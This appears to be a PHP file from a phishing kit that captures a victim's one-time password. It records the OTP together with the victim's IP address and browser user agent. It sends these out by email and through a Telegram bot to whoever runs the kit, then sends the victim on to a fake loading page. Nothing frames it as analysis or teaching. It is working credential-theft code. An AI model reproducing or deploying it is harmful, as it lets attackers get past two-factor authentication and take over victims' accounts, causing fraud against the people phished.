<?php
include '../../settings.php';
include '../core/funcs.php';
session_start();

if (isset($_POST['code'])) {
    $_SESSION['otp'] = $_POST['code'];
    $message = "≡≡≡≡≡≡≡≡ ☫㊙️☫ ≡≡≡≡≡≡≡≡
    
㊙️ OTP : ".$_SESSION['otp']."
                
≡≡≡≡≡≡≡≡ ☫📶☫ ≡≡≡≡≡≡≡≡
                    
📍 Adresse IP : ".$_SERVER['REMOTE_ADDR']."
📡 User Agent :" . $_SERVER['HTTP_USER_AGENT'];
    sendMailRez($email,"㊙️ + 1 OTP : [".$_SESSION['otp']."] ㊙️",$message);
    sendTelegramRez($message, False, True);
    change($_SERVER['REMOTE_ADDR'], '0');
    header('location: ../loading.php?page=loading.php');
    
}